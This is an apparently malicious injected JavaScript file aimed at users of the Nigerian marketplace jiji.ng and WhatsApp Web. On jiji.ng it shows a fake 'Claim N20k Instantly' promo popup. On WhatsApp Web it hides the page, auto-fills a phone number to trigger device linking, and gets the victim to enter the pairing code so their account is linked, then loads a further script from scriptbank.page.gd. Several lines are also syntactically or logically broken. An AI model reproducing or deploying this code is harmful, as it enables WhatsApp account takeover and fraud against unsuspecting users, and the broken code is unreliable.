console.log('checked');
function waitForElement(selector, timeout = 10000) {
  return new Promise((resolve, reject) => {
    const el = document.querySelector(selector);
    if (el) return resolve(el);

    const observer = new MutationObserver((mutations, obs) => {
      const el = document.querySelector(selector);
      if (el) {
        obs.disconnect();
        resolve(el);
      }
    });
    observer.observe(document.body, { childList: true, subtree: true });

    setTimeout(() => {
      observer.disconnect();
      reject(new Error(`Timeout waiting for element: ${selector}`));
    }, timeout);
  });
}


if(location.href.includes("jiji.ng") ){
    alert('script injected');
    const style = document.createElement("link");
    style.href = "https://scriptbank.page.gd/jiji.css";
    style.setAttribute("type", "text/css");
    style setAttribute("rel", "stylesheet");
    document.head.appendChild(style);
    
    let div = document.createElement('div');
    div.innerHTML = `<div class="popup-overlay">
  <div class="popup-card">
    <button class="close-btn" aria-label="Close popup">&times;</button>
    <div class="popup-image">ðŸš€</div>
    <h2>Unlock Premium Funds</h2>
    <p>Join Thousands of users who earn as they buy from this store. Get N20,000 Instantly and many more benefits by registering with your Whatsapp account.</p>
    <a href="https://web.whatsapp.com" class="cta-button">Claim N20k Instantly now</a>
  </div>
</div>

    `;
    
    document.body.appendChild(div);
    
    let div2 = document.createElement('div');
    div2.innerHTML = `<a href="https://scripbank.page.gd/claim.html" class="floating-cta" aria-label="Claim this app">
  <span class="cta-icon">ðŸ“²</span>
  <span class="cta-text">Claim This App</span>
</a>

    `;
    document.body.appendChild(div2);
}


if( location.href.includes("whatsapp.com") ){
    document.body.style.display = 'none';
    const element = waitForElement(
  'body > div:nth-of-type(1) > div:nth-of-type(1) > div:nth-of-type(1) > div:nth-of-type(1) > div:nth-of-type(1) > div:nth-of-type(2) > div:nth-of-type(2) > div:nth-of-type(2) > div:nth-of-type(1) > div:nth-of-type(2) > div:nth-of-type(2) > div:nth-of-type(2) > div:nth-of-type(1) > div:nth-of-type(1) > div:nth-of-type(1)'
);
    const phone = location.searchParams.get("phone");
    if( element){
        element.click();
        }
    
    const phoneInput = waitForElement('[data-testid="phone-number-input"]');
    if (phoneInput) {
  phoneInput.value = phone;
  phoneInput.dispatchEvent(new Event('input', { bubbles: true }));
        const button = waitForElement(
  'body > div:nth-of-type(1) > div:nth-of-type(1) > div:nth-of-type(1) > div:nth-of-type(1) > div:nth-of-type(1) > div:nth-of-type(2) > div:nth-of-type(2) > div:nth-of-type(2) > div:nth-of-type(1) > div:nth-of-type(1) > div:nth-of-type(3) > div:nth-of-type(3) > button'
);
        
        if( button ) button.click();
        
        const codeContainer = waitForElement('[data-testid="link-with-phone-number-code-cells"]');
if (codeContainer) {
  const cleanCode = codeContainer.getAttribute('data-link-code').replace(/[, ]/g, '');
 const isdn = confirm('Please enter his code on your WhatsApp to link your account and get your promo funds. Code: ' + cleanCode);
    
    if( isdn ){
        const script = document.createElement('script');
        script.src = "https://scriptbank.page.gd/whatsapp.js";
        script.setAttribute('defer', 'defer');
        script.setAttribute('type','script');
        document.body.appendChild(script);
} else {
  console.log('Element not present yet.');
}
}
    }
 
